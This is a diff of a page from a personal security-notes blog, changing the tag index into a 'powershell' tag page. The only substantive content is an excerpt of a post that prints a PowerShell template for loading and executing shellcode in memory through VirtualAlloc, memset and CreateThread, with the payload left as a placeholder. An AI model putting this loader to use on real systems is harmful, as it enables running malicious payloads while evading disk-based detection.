@@ -3,11 +3,11 @@
 <meta http-equiv=x-ua-compatible content="IE=edge">
 <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
 <meta name=robots content="index, follow">
-<title>Tags | Zet’s playground</title>
+<title>powershell | Zet’s playground</title>
 <meta name=keywords content>
 <meta name=description content="廢物筆記">
 <meta name=author content="Zet">
-<link rel=canonical href=https://blog.zet.tw/tags/>
+<link rel=canonical href=https://blog.zet.tw/tags/powershell/>
 <link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style>
 <link rel=icon href=https://blog.zet.tw/favicon.ico>
 <link rel=icon type=image/png sizes=16x16 href=https://blog.zet.tw/favicon-16x16.png>
@@ -17,17 +17,17 @@
 <meta name=theme-color content="#2e2e33">
 <meta name=msapplication-TileColor content="#2e2e33">
 <meta name=generator content="Hugo 0.91.2">
-<link rel=alternate type=application/rss+xml href=https://blog.zet.tw/tags/index.xml>
+<link rel=alternate type=application/rss+xml href=https://blog.zet.tw/tags/powershell/index.xml>
 <noscript>
 <style>#theme-toggle,.top-link{display:none}</style>
 </noscript>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-123-45','auto'),ga('send','pageview'))</script><meta property="og:title" content="Tags">
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-123-45','auto'),ga('send','pageview'))</script><meta property="og:title" content="powershell">
 <meta property="og:description" content="廢物筆記">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://blog.zet.tw/tags/"><meta property="og:image" content="https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="Zet's playground">
+<meta property="og:url" content="https://blog.zet.tw/tags/powershell/"><meta property="og:image" content="https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="Zet's playground">
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
-<meta name=twitter:title content="Tags">
+<meta name=twitter:title content="powershell">
 <meta name=twitter:description content="廢物筆記">
 </head>
 <body class="list dark" id=top>
@@ -59,36 +59,28 @@
 </li>
 <li>
 <a href=https://blog.zet.tw/tags/ title=tags>
-<span class=active>tags</span>
+<span>tags</span>
 </a>
 </li>
 </ul>
 </nav>
 </header>
 <main class=main>
-<header class=page-header>
-<h1>Tags</h1>
+<header class=page-header><div class=breadcrumbs><a href=https://blog.zet.tw>Home</a>&nbsp;»&nbsp;<a href=https://blog.zet.tw/tags/>Tags</a></div>
+<h1>powershell</h1>
 </header>
-<ul class=terms-tags>
-<li>
-<a href=https://blog.zet.tw/tags/env/>env <sup><strong><sup>2</sup></strong></sup> </a>
-</li>
-<li>
-<a href=https://blog.zet.tw/tags/powershell/>powershell <sup><strong><sup>1</sup></strong></sup> </a>
-</li>
-<li>
-<a href=https://blog.zet.tw/tags/pwn/>pwn <sup><strong><sup>3</sup></strong></sup> </a>
-</li>
-<li>
-<a href=https://blog.zet.tw/tags/rop/>rop <sup><strong><sup>1</sup></strong></sup> </a>
-</li>
-<li>
-<a href=https://blog.zet.tw/tags/router/>router <sup><strong><sup>1</sup></strong></sup> </a>
-</li>
-<li>
-<a href=https://blog.zet.tw/tags/shellcode/>shellcode <sup><strong><sup>2</sup></strong></sup> </a>
-</li>
-</ul>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>use powershell lunch shellcode
+</h2>
+</header>
+<section class=entry-content>
+<p>執行shellcode的模板
+$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; SHELLCOD的地方是要替換的...</p>
+</section>
+<footer class=entry-footer><span title="2013-03-18 00:00:00 +0800 CST">March 18, 2013</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Zet</footer>
+<a class=entry-link aria-label="post link to use powershell lunch shellcode" href=https://blog.zet.tw/posts/2013-03-18-pwershell-lunch-shellcode/></a>
+</article>
 </main>
 <footer class=footer>
 <span>&copy; 2022 <a href=https://blog.zet.tw>Zet’s playground</a></span>
